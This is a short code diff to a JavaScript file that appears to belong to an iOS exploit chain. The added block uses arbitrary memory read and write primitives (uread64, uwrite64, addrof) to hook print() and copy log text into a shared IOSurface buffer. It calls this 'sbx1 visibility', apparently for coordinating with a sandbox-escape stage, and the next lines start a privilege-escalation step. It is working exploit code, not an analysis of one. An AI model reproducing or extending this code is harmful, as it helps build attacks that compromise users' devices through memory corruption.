@@ -1,4 +1,37 @@
 (() => {
+  // IOSurface direct log init - writes to IOSurface for sbx1 visibility
+  // Must run BEFORE fcall_init(), using only uread64/uwrite64/uwrite8 primitives
+  (function() {
+    try {
+      let _fob_buf = uread64(addrof(func_offsets_array) + 0x10n);
+      let _surf = uread64(_fob_buf + 19n * 0x8n);  // surface_address_remote at [19]
+      if (_surf && _surf != 0n) {
+        let _log_off_ptr = _surf + 0xFE00n;
+        let _log_base = _surf + 0xF000n;
+        let _orig_print = print;
+        print = function(s) {
+          // Write to IOSurface first (immediate sbx1 visibility)
+          try {
+            let off = uread64(_log_off_ptr);
+            if (off + 256n < 0xE00n) {
+              let cstr = get_cstring(String(s));
+              let i = 0n;
+              for (; i < 254n; i++) {
+                let ch = uread8(cstr + i);
+                if (ch === 0) break;
+                uwrite8(_log_base + off + i, ch);
+              }
+              uwrite8(_log_base + off + i, 0x0an);
+              uwrite64(_log_off_ptr, off + i + 1n);
+            }
+          } catch(e) {}
+          // Also call original print (pe_log_buf + syslog)
+          try { _orig_print(s); } catch(e) {}
+        };
+      }
+    } catch(e) {}
+  })();
+
   // Initialize fcall first - required before any print() or fcall()
   fcall_init();
   print("[PE] fcall_init done");
